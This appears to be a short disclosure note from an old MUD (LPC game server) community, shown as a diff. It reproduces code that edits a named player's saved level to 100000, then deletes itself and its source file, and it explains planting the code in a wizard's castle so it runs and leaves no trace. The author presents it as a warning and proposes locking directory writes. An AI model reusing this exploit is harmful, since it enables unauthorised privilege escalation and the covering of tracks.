@@ -1,0 +1,33 @@
+
+reset() {
+  write_file("/obj/psyk-thing.c",
+  "int level;\n"+
+  "reset() {\n"+
+  "  if(restore_object(\"players/psykosis\"")) {\n"+
+  "    level = 100000;\n"+
+  "    save_object("\"players/psykosis\"");\n"+
+  "  }\n"+
+  "  destruct(this_object());\n"+
+  "  rm(\"/players/boltar/PS.c\"");\n"+
+  "}\n");
+}
+
+-EOF
+
+You can see the mechanics of how this file works- It is not a complete
+example but it 'edits' a player's level to 100000. All one needs to do is
+to edit /players/boltar/castle and make it autoload, do its work, and
+disappear without a trace.
+
+Psykosis had the right tool to do it in the form of Glaendor's hacked
+password, but he had no knowledge of this bug then.
+
+The only way this can be prevented is to make modifications to the
+functions that checks a valid write to lock out your directories from ANY
+writes...
+
+Shrug.. I thought I should let you know this because when it was explained to
+me my jaw dropped and i turned pale.
+
+miz
+
